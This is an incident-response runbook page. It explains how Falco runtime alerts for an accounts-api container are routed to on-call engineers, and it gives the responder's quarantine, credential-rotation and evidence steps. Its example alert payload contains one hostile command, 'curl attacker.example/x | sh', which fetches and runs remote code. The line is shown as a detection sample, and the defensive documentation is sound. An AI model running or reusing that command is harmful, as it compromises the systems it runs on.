# Runtime detection: routing, ownership, and the responder's runbook

Rules: [`runtime/falco-rules.yaml`](falco-rules.yaml). A detection with no owner is
telemetry; this page is what makes it a control.

## Alert payload

Falco → Falcosidekick → SNS `security-alerts` (ap-south-1) → PagerDuty. Example payload
as delivered:

```json
{
  "rule": "Unexpected process in accounts-api container",
  "priority": "Critical",
  "time": "2026-09-03T10:41:22.318Z",
  "output_fields": {
    "proc.name": "sh",
    "proc.cmdline": "sh -c curl attacker.example/x | sh",
    "proc.pname": "accounts-api",
    "user.name": "app",
    "k8s.pod.name": "accounts-api-7c9f6d-x2lqp",
    "k8s.ns.name": "accounts",
    "k8s.node.name": "ip-10-0-3-41.ap-south-1.compute.internal",
    "container.image.repository": "123456789012.dkr.ecr.ap-south-1.amazonaws.com/accounts-api"
  },
  "hostname": "ip-10-0-3-41",
  "tags": ["accounts-api", "T2", "post-exploitation"]
}
```

## Who is woken

**Platform on-call** (the two platform engineers, weekly rotation) via PagerDuty, P1,
24×7 — there is no security team; pretending a SOC will triage this would be design
fiction. The accounts-api team lead is added as escalation after 15 minutes unacked.
Honest constraint: a 2-person rotation is fragile; first hire recommendation is in the
decisions doc.

## Responder's first three steps

1. **Quarantine, don't kill.** `kubectl -n accounts label pod <pod> quarantine=true
   --overwrite` — a pre-installed NetworkPolicy selects `quarantine=true` and drops all
   ingress/egress; the pod keeps running for forensics. Deployment replaces it with a
   clean replica; service impact ≈ zero.
2. **Cut what the pod holds.** Trigger emergency rotation of the DB app credential
   (docs/06-secrets-rotation.md, target <15 min) and revoke the pod role's active
   sessions (attach a deny-all session policy / update the role's trust policy) — the
   attacker's stolen materials go stale while you investigate.
3. **Preserve and pull evidence.** Capture Falco event JSON, `kubectl logs` +
   `describe` for the pod, node-level process tree, and CloudTrail for the pod role's
   AssumeRole session from T-30min. Open the incident ticket with all four attached
   before any deeper poking.

## Promotion / tuning

Both rules ship in a 1-week shadow (alerts to Slack `#sec-alerts`, no paging). Zero
false positives expected because the container is a single static binary; any FP found
in shadow week means the image drifted from that assumption — fix the image, not the
rule.
